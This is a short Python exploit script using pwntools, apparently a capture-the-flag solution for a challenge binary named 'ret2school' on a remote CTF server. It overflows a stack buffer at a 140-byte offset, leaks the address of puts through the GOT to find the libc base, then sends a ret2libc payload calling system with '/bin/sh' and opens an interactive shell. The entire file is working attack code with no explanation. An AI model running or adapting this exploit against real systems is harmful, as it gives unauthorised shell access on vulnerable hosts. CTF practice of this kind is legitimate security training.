from pwn import *

elf = ELF("ret2school")
libc = ELF("libc-2.23.so")

# r=elf.process(env={'LD_PRELOAD':libc.path})
r = remote("ctf.hackusati.tech", 7003)
# pause()
offset = 140

payload = b"A" * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
r.sendlineafter(b"name?", payload)
r.recvuntil(b"!\n")
puts = u32(r.recv(4))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
print(hex(puts))
print(hex(libc_base))

payload = b'A' * offset
payload += p32(system)
payload += b"AAAA"
payload += p32(binsh)
r.sendline(payload)

r.interactive()
